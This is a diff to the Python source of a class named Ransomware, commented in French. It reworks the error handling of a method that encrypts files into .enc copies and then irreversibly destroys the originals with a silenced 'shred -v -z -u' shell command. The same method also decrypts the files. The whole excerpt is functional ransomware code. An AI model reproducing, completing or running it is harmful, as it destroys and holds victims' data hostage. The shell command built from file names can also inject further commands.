@@ -75,27 +75,26 @@ class Ransomware:
         Ecrit le nouveau fichier chiffré dans la forme xxxx.enc
         Sinon déchiffre le fichier xxxx.enc et l'écrit dans xxxx en enlevant .enc
         """
-        if not encrypted:
-            try:
-                f = open(file_path, 'rb+')
-            except OSError:
-                print("marche pas")
-            _data = f.read()
-            data = self.cryptor.encrypt(_data)
-            f_enc = open(file_path + ".enc", 'wb')
-            f_enc.write(data)
-            os.system("shred -v -z -u "+ file_path + " >/dev/null 2>&1")           
-        else:
-            try:
-                f = open(file_path, 'rb+')
-            except OSError:
-                print("marche pas")
-            _data = f.read()
-            data = self.cryptor.decrypt(_data)
-            f_dec = open(file_path.replace(".enc",""), 'wb')
-            f_dec.write(data)
-            os.system("shred -v -z -u " + file_path +" >/dev/null 2>&1") # redirige les erreurs de la sortie std dans la corbeille
+        try:
+            if not encrypted:
 
+                f = open(file_path, 'rb+')
+                _data = f.read()
+                data = self.cryptor.encrypt(_data)
+                f_enc = open(file_path + ".enc", 'wb')
+                f_enc.write(data)
+                os.system("shred -v -z -u "+ file_path + " >/dev/null 2>&1")           
+            else:
+
+                f = open(file_path, 'rb+')
+
+                _data = f.read()
+                data = self.cryptor.decrypt(_data)
+                f_dec = open(file_path.replace(".enc",""), 'wb')
+                f_dec.write(data)
+                os.system("shred -v -z -u " + file_path +" >/dev/null 2>&1") # redirige les erreurs de la sortie std dans la corbeille
+        except OSError:
+            print("FLORIAN")
 
 
 
